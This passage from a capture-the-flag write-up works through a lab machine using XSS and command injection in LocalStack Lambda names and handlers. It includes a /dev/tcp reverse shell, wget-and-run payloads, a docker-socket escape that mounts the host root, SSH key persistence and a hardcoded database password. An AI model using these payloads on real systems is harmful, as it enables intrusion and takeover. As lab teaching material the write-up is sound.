oxdf@hacky$ aws lambda create-function --function-name 'ex; ping -c 1 10.10.14.6' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
{
    "FunctionName": "ex; ping -c 1 10.10.14.6",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex; ping -c 1 10.10.14.6",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T18:38:39.821+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "eefc33ce-bc21-4f97-963f-9a2aa2c3987d",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

I’ll trigger the XSS to get the dashboard again and listen with `tcpdump`, but no ICMP arrived.

#### Local

Because this is a lot to troubleshoot over a waiting for XSS, I’ll set up a local copy. I had to move Burp to a different port, as LocalStack wants 8080. I have the `docker-compose.yml` file. In the directory with that file, I’ll run `docker-compose up`, and it starts.

On `http://127.0.0.1:8080` there’s a dashboard:

![image-20210825144301535](https://0xdfimages.gitlab.io/img/image-20210825144301535.png)

To interact with my local copy of LocalStack, I’ll use `awslocal` (from [here](https://github.com/localstack/awscli-local), `pip3 install awscli-local`) to avoid having to put the `--endpoint-url` string in to interact with the local copy, as well as making clear which instance I’m working with.

I’ll create a Lambda function:

```

oxdf@hacky$ awslocal lambda create-function --function-name 'ex' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --handler index.handler --runtime nodejs12.x
{
    "FunctionName": "ex",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T18:50:03.403+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "02efdc6d-506b-489b-861e-97026426a94d",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

On refreshing the dashboard, first there’s a spinner suggesting it’s loading, and about five seconds later, it shows my lambda:

![image-20210825145206991](https://0xdfimages.gitlab.io/img/image-20210825145206991.png)

I’ll try creating one named `ex;ping -c 1 172.17.0.1` (my local IP on the docker net). On refreshing, again, it takes five to ten seconds, but then it loads:

![image-20210825145440757](https://0xdfimages.gitlab.io/img/image-20210825145440757.png)

There’s also ICMP packets at `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni docker0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on docker0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:55:23.581855 IP 172.17.0.2 > 172.17.0.1: ICMP echo request, id 731, seq 1, length 64
14:55:23.581911 IP 172.17.0.1 > 172.17.0.2: ICMP echo reply, id 731, seq 1, length 64

```

This is RCE, and good because it confirms the vulnerability works, even on the latest image. But it’s bad because it shows why it’s failing remotely - the page has to fully load, and my XSS JavaScript is only requesting the page source, so unlike a browser, it doesn’t then try to load and execute all the JavaScript on that page.

#### IFrame

[This post](https://stackoverflow.com/questions/19328143/xmlhttprequest-to-fetch-dom-with-dynamic-content) on StackOverflow asks about how to use an `XMLHttpRequest` to fetch the DOM based on dynamic content. I’ll use that to craft a payload that will load the page into an iframe, and wait for it to load.

```

var iframe = document.createElement('iframe');    
iframe.src = 'http://127.0.0.1:8080';    
iframe.onload = function() {    
  setTimeout(function() {    
    iframe.parentNode.removeChild(iframe);    
    }, 5000);    
};    
iframe.sandbox = 'allow-scripts';    
iframe.style.height = '1px';    
iframe.style.width = '1px';    
iframe.style.position = 'fixed';    
iframe.style.top = '-9px';    
iframe.style.left = '-9px';

document.body.appendChild(iframe);    

```

I’ll send an XSS to fetch that, and submit a new lambda function:

```

oxdf@hacky$ aws lambda create-function --function-name 'ex; ping -c 1 10.10.14.6' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
{
    "FunctionName": "ex; ping -c 1 10.10.14.6",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex; ping -c 1 10.10.14.6",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T19:04:26.602+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "2e71059f-9d2f-4679-a2b6-f0d4469a5147",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

After a minute or so, there’s a request at the webserver:

```
10.10.11.112 - - [25/Aug/2021 15:06:11] "GET /xss-6.js HTTP/1.1" 200 -

```

Four seconds later ICMP arrives:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:06:15.548696 IP 10.10.11.112 > 10.10.14.6: ICMP echo request, id 604, seq 1, length 64
15:06:15.548734 IP 10.10.14.6 > 10.10.11.112: ICMP echo reply, id 604, seq 1, length 64

```

That’s remote RCE!

#### Alternative to IFrame

When talking to IppSec about how I solved this, he pointed out that my original XSS payload would have actually made this much easier. Instead of loading remote script, I can send:

```

<script>document.location="http://127.0.0.1:8080"</script>

```

This will redirect the entire browser session over to the dashboard, and, as long as the automation is done with a full emulated browser (which it is), it will load the page and the JavaScript, loading the full application.

#### Shell

I’ll create a simple reverse shell script, `shell.sh`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

I’ll submit a lambda again, this time with the name:

```
--function-name 'ex; wget 10.10.14.6/shell.sh -O /tmp/.0xdf.sh; bash /tmp/.0xdf.sh'

```

This payload will request `shell.sh` from my server and store it in `/tmp/.0xdf.sh`, and then run it with Bash.

After a couple minutes it requests the XSS payload, and then four seconds later the shell:

```
10.10.11.112 - - [25/Aug/2021 15:21:04] "GET /xss-6.js HTTP/1.1" 200 -
10.10.11.112 - - [25/Aug/2021 15:21:08] "GET /shell.sh HTTP/1.1" 200 -

```

And then there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 51690
bash: cannot set terminal process group (22): Not a tty
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
bash-5.0$

```

I can upgrade with `python` and `pty`:

```

bash-5.0$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
bash: /root/.bashrc: Permission denied
bash-5.0$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
bash-5.0$ 

```

And there’s `user.txt` in `/home/localstack`:

```

bash-5.0$ cat /home/localstack/user.txt
c877918f************************

```

## Shell as root on localstack

### Enumeration

#### Container FS

I’m currently the localstaack user in what is clearly a container. The container has the IP 172.17.0.2, and there’s a `/.dockerenv` file.

There’s two user home directories, `localstack` and `node`. Both are completely empty:

```

bash-5.0$ ls -la home/localstack/
total 12
drwxr-sr-x    1 localsta localsta      4096 Jul 19 17:46 .
drwxr-xr-x    1 root     root          4096 Feb  1  2021 ..
lrwxrwxrwx    1 root     localsta         9 Jul 19 17:46 .ash_history -> /dev/null
-r--r-----    1 root     localsta        33 Jul 12 13:59 user.txt
bash-5.0$ ls -la home/node/
total 8
drwxr-sr-x    2 node     node          4096 Dec 17  2020 .
drwxr-xr-x    1 root     root          4096 Feb  1  2021 ..

```

The LocalStack code is at `/opt/code/localstack`, but it also looks like what came from GitHub.

#### Processes

In a situation where I need a Linux privesc but can’t find anything on the file system, I’ll turn to [pspy](https://github.com/DominicBreuker/pspy) to look at running processes. I’ll upload `pspy64` to the container and give it a run. Typically I’m looking for anything unusual that runs periodically, but `pspy` doesn’t reveal anything running on a schedule like a cron.

The idea here is to look at what runs when I create and invoke a Lambda function. I’ll go back to my original NodeJs POC that worked, and upload it as a new Lambda named `ex`:

```

oxdf@hacky$ aws lambda create-function --function-name 'ex' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler index.handler --runtime nodejs12.x
{
    "FunctionName": "ex",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T20:28:45.729+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "3c04057b-f2b2-4ae6-a670-819ddc31a65a",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

In `pspy`, that’s a single process that starts, running `unzip` on an archive, presumably the one I just uploaded:

```

2021/08/25 20:28:45 CMD: UID=0    PID=990    | unzip -o -q /tmp/localstack/zipfile.83615cde/original_lambda_archive.zip

```

I’ll `invoke` the Lambda:

```

oxdf@hacky$ aws lambda invoke --function-name ex --endpoint-url http://s3-testing.stacked.htb out.json
{
    "StatusCode": 200,
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}

```

Three additional processes start:

```

2021/08/25 20:30:59 CMD: UID=0    PID=1003   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
2021/08/25 20:30:59 CMD: UID=0    PID=1002   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
2021/08/25 20:30:59 CMD: UID=0    PID=1010   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID";

```

### Command Injection in LocalStack

#### Looking for Injection

Each of these look the same, so I’ll break one down with whitespace and syntax. There’s three commands run by `sh`:

```

/bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler")";
docker cp "/tmp/localstack/zipfile.4ef57e23/." "$CONTAINER_ID:/var/task";
docker start -ai "$CONTAINER_ID";

```

`docker create`, `docker cp`, and `docker start`. Looking across all of that, the only place I really have input is in the first, which once I remove all the `-e` parameters that set environment vars in the container, looks like:

```

docker create -i --rm "lambci/lambda:nodejs12.x" "index.handler"

```

What’s interesting here is that I control the input for the image name and the function that’s called.

#### POC

To test for command injection in the `--handler` option, I’ll create a Lambda with a subshell in it to `wget` the path `/test` on my host:

```

oxdf@hacky$ aws lambda create-function --function-name 'ex' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --handler 'index.handler$(wget 10.10.14.6/test)' --runtime nodejs12.x
{
    "FunctionName": "ex",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:ex",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler$(wget 10.10.14.6/test)",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T20:49:18.858+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "1fbfe1e9-d714-4a7c-b0d0-d303dc15650e",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

When I invoke this, it fails:

```

oxdf@hacky$ aws lambda invoke --function-name ex --endpoint-url http://s3-testing.stacked.htb out.json
{
    "StatusCode": 200,
    "FunctionError": "Unhandled",
    "LogResult": "",
    "ExecutedVersion": "$LATEST"
}

```

At `pspy`, the same three processes, but one more before it:

```

2021/08/25 20:55:27 CMD: UID=0    PID=1389   | wget 10.10.14.6/test 
2021/08/25 20:55:27 CMD: UID=0    PID=1388   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler;$(wget 10.10.14.6/test)")";docker cp "/tmp/localstack/zipfile.0e05eb2c/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
2021/08/25 20:55:27 CMD: UID=0    PID=1387   | /bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY" -e NODE_TLS_REJECT_UNAUTHORIZED="$NODE_TLS_REJECT_UNAUTHORIZED"   --rm "lambci/lambda:nodejs12.x" "index.handler;$(wget 10.10.14.6/test)")";docker cp "/tmp/localstack/zipfile.0e05eb2c/." "$CONTAINER_ID:/var/task"; docker start -ai "$CONTAINER_ID"; 
2021/08/25 20:55:27 CMD: UID=0    PID=1396   | docker cp /tmp/localstack/zipfile.0e05eb2c/. 055307ed86c3a9abf7e78574787249c1162138905afdea2b7590502d4251f4bd:/var/task 

```

And a request at my Python web server:

```
10.10.11.112 - - [25/Aug/2021 16:55:27] code 404, message File not found
10.10.11.112 - - [25/Aug/2021 16:55:27] "GET /test HTTP/1.1" 404 -

```

This is successful command injection.

#### Shell

I’ve already got `/tmp/.0xdf.sh` as a reverse shell in this container. I’ll create a Lambda that calls it:

```

oxdf@hacky$ aws lambda create-function --function-name shell --handler 'index.handler;$(bash /tmp/.0xdf.sh)' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime nodejs12.x
{
    "FunctionName": "shell",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:shell",
    "Runtime": "nodejs12.x",
    "Role": "arn:aws:iam::123456789012:role/lambda-role",
    "Handler": "index.handler;$(bash /tmp/.0xdf.sh)",
    "CodeSize": 291,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2021-08-25T20:59:54.009+0000",
    "CodeSha256": "RflcSNGUgqyNEvEtX4iMOtjiR8yEmBLyRFZIk3h+BDE=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "52c9494e-accb-47e5-b0ff-d570d9725d49",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}

```

And on invoking with:

```

oxdf@hacky$ aws lambda invoke --function-name shell --endpoint-url http://s3-testing.stacked.htb out.json

```

It hangs, but a shell returns:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.112] 54300
bash: cannot set terminal process group (1479): Not a tty
bash: no job control in this shell
bash-5.0# 

```

## Shell as root on Stacked

### Enumerate Docker

Because the container is spawning dockers, at least the root user must have access to the docker socket. As localstack, I could not access it because the user can’t read the certificate:

```

bash-5.0$ docker ps
WARNING: Error loading config file:/root/.docker/config.json - stat /root/.docker/config.json: permission denied
could not read CA certificate "/root/.docker/ca.pem": open /root/.docker/ca.pem: permission denied

```

root doesn’t have that issue:

```

bash-5.0# docker ps
CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
1af67837dbde        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   4 hours ago         Up 4 hours          127.0.0.1:443->443/tcp, 127.0.0.1:4566->4566/tcp, 127.0.0.1:4571->4571/tcp, 127.0.0.1:8080->8080/tcp   localstack_main

```

There are a handful of images available:

```

bash-5.0# docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        5 weeks ago         888MB
localstack/localstack-full   <none>              0601ea177088        6 months ago        882MB
lambci/lambda                nodejs12.x          22a4ada8399c        6 months ago        390MB
lambci/lambda                nodejs10.x          db93be728e7b        6 months ago        385MB
lambci/lambda                nodejs8.10          5754fee26e6e        6 months ago        813MB

```

### Root Filesystem Access

I’ll try to start one of these containers with `-v /:/mnt` which will mount the root `/` to `/mnt` inside the container. For any of the `lambci/lambda` images, it complains about a “Bad handler”:

```

bash-5.0# docker run -v /:/mnt -it 22a4ada8399c   
2021-08-25T21:16:17.809Z        undefined       ERROR   Uncaught Exception      {"errorType":"Runtime.MalformedHandlerName","errorMessage":"Bad handler","stack":["Runtime.MalformedHandlerName: Bad handler","    at _splitHandlerString (/var/runtime/UserFunction.js:43:11)","    at Object.module.exports.load (/var/runtime/UserFunction.js:138:31)","    at Object.<anonymous> (/var/runtime/index.js:43:30)","    at Module._compile (internal/modules/cjs/loader.js:999:30)","    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1027:10)","    at Module.load (internal/modules/cjs/loader.js:863:32)","    at Function.Module._load (internal/modules/cjs/loader.js:708:14)","    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:60:12)","    at internal/main/run_main_module.js:17:47"]}
START RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe Version: $LATEST
END RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe
REPORT RequestId: 6be74fdd-4b12-1b15-49ba-b6f083015ffe  Init Duration: 122.15 ms        Duration: 1.88 ms       Billed Duration: 2 ms   Memory Size: 1536 MB    Max Memory Used: 40 MB

{"errorType":"Runtime.MalformedHandlerName","errorMessage":"Bad handler"}

```

The `localstack-full` image starts right up (using `-d` so that it runs in the background):

```

bash-5.0# docker run -d -v /:/mnt -it 0601ea177088
6eac05a5a4305aabb85d268da764f628cab83f9d447992a1bfe5374abfe841c5

```

The command returns the `CONTAINER ID`, which I can also see the start of with `docker ps`:

```

bash-5.0# docker ps       
CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
6eac05a5a430        0601ea177088                        "docker-entrypoint.sh"   14 seconds ago      Up 13 seconds       4566/tcp, 4571/tcp, 8080/tcp                                                                           pedantic_golick
1af67837dbde        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   4 hours ago         Up 4 hours          127.0.0.1:443->443/tcp, 127.0.0.1:4566->4566/tcp, 127.0.0.1:4571->4571/tcp, 127.0.0.1:8080->8080/tcp   localstack_main

```

I’ll use `docker exec` to drop into this container, and there’s the root filesystem in `/mnt`:

```

bash-5.0# hostname
1af67837dbde
bash-5.0# docker exec -it 6eac05a5a430 bash
bash-5.0# hostname
6eac05a5a430
bash-5.0# ls /mnt/
bin         etc         lib64       mnt         run         sys
boot        home        libx32      opt         sbin        tmp
cdrom       lib         lost+found  proc        srv         usr
dev         lib32       media       root        swap.img    var
bash-5.0# cat /mnt/etc/hostname 
stacked

```

I could actually use the Lambda containers, just overriding the entry with `--entrypoint bash` (and no `-d` since the entry is what I want to interact with):

```

bash-5.0# docker run -v /:/mnt --entrypoint bash -it 22a4ada8399c 
bash-4.2$ cat /mnt/etc/hostname 
stacked

```

To access everything, I’ll need to run that entry as root with `-u root`:

```

bash-5.0# docker run -v /:/mnt --entrypoint bash -u root -it 22a4ada8399c
bash-4.2#

```

From here I can grab `root.txt`:

```

bash-4.2# cat /mnt/root/root.txt
bd97095c************************

```

### Shell

To get a root shell, I’ll just write my public key into `/mnt/root/.ssh/authorized_keys`:

```

bash-4.2# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys

```

Now I can SSH to Stacked:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@stacked.htb
...[snip]...
root@stacked:~# 

```

## Beyond Root

### Message App

#### Reconfigure

I want to look more at what’s happening with the local mail application and the XSS. With the root shell on the host, I can reconfigure the web server to be accessible from my VM.

There are four hosts defined and enabled for Apache:

```

root@stacked:/etc/apache2/sites-enabled# ls
001-website.conf  003-proxy.conf  004-portfolio.conf  005-management.conf

```

`mail.stacked.htb` is in `sites-enables 005-management.conf`, which starts as:

```

<VirtualHost 127.0.0.1:80>
        ServerAdmin webmaster@localhost
        ServerName mail.stacked.htb
        DocumentRoot /var/www/management
        <Directory /var/www/management>
                Options -Indexes
                Require all granted
                DirectoryIndex dashboard.php
        </Directory>
</VirtualHost>

```

On the first line I’ll replace `127.0.0.1` with `*` and then restart apache (`service apache2 restart`).

Now it loads in Firefox at `http://mail.stacked.htb`:

[![image-20220316153045584](https://0xdfimages.gitlab.io/img/image-20220316153045584.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220316153045584.png)

#### Play with Mailbox

When I send a message, it shows up on a refresh on `mail.stacked.htb`:

![image-20220316153203938](https://0xdfimages.gitlab.io/img/image-20220316153203938.png)

Clicking the link (“asd” in this case) loads the message:

![image-20220316153230472](https://0xdfimages.gitlab.io/img/image-20220316153230472.png)

The referer header is there. This makes sense if the mailbox is meant to receive from multiple different sites, where the same employee can respond to all of them.

#### XSS

I’ll update the payload to:

```

Referer: <script>alert(1)</script>

```

On sending that and reloading, the message now pops a message box:

![image-20220316153448876](https://0xdfimages.gitlab.io/img/image-20220316153448876.png)

There is something that is cleaning up messages, which is why my new message here is still message `id=2`. That isn’t always the case, but the cleanup is happening relatively frequently. Still, if I send three messages all together, they are all there:

![image-20220316163000341](https://0xdfimages.gitlab.io/img/image-20220316163000341.png)

### Automation

#### cron

I’ll take a quick look at how the XSS is automated to simulate the user viewing the mailbox. The `cron` is for the adam user:

```

root@stacked:/etc/apache2/sites-enabled# crontab -l -u adam
...[snip]...
# m h  dom mon dow   command
@reboot rm -rf /home/adam/selenium/tmp/* 
#*/2 * * * * /usr/bin/python3 /home/adam/selenium/check.py
*/2 * * * * cd /home/adam/selenium && /bin/sh -c /home/adam/selenium/check.sh

```

On reboot there’s some clearing of the `tmp` folder, and then every two minutes it runs `check.sh`.

#### check.sh

`check.sh` basically checks the process list and restarts the browser processes:

```

#!/bin/sh
                                                    
selenium_restart()
{
  pkill -f firefox
  pkill -f geckodriver
  pkill -f check.py
  rm -rf /home/adam/selenium/tmp/*
  export PATH=$PATH:/home/adam/selenium
  TMPDIR=/home/adam/selenium/tmp /home/adam/selenium/check.py &
}                      

if ! ps auxwww | grep -v grep | grep firefox
then                                 
    selenium_restart  
elif ! ps auxwww | grep -v grep | grep geckodriver
then                                               
    selenium_restart             
elif ! ps auxwww | grep -v grep | grep check.py
then
    selenium_restart
fi  

```

It defines a function called `selenium_restart`. [Selenium](https://www.selenium.dev/) is a headless automatable browser framework that is typically used for testing. In this function, it kills processes and cleans `tmp`, and then calls `check.py`. The `if`/`elif` statements are checking for three different lines in the process list. If any of `firefox`, `geckeodriver`, and `check.py` are *not* in the process list, then it calls `selenium_restart`.

#### check.py

`check.py` is what actually launches and drives Firefox:

```

#!/usr/bin/python3

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.common.exceptions import TimeoutException
import MySQLdb
import time
import os
ops = FirefoxOptions()
ops.add_argument('--headless')
profile = FirefoxProfile()
#profile.set_preference('browser.cache.disk.enable', False)
#profile.set_preference('browser.cache.memory.enable', False)
#profile.set_preference('browser.cache.offline.enable', False)
#profile.set_preference('network.cookie.cookieBehavior', 2)
#profile.set_preference("http.response.timeout", 5)
#profile.set_preference("dom.max_script_run_time", 5)
driver = webdriver.Firefox(executable_path=r'/home/adam/selenium/geckodriver',options=ops,firefox_profile=profile)
#driver.set_page_load_timeout(20)
db = MySQLdb.connect("localhost", "adam", "ReallyStrongSQLPassword@2021", "contact")

def main():
    c = db.cursor()
    c.execute("select * from messages where id > 1;")
    res = c.fetchall()
    print("STARTING")
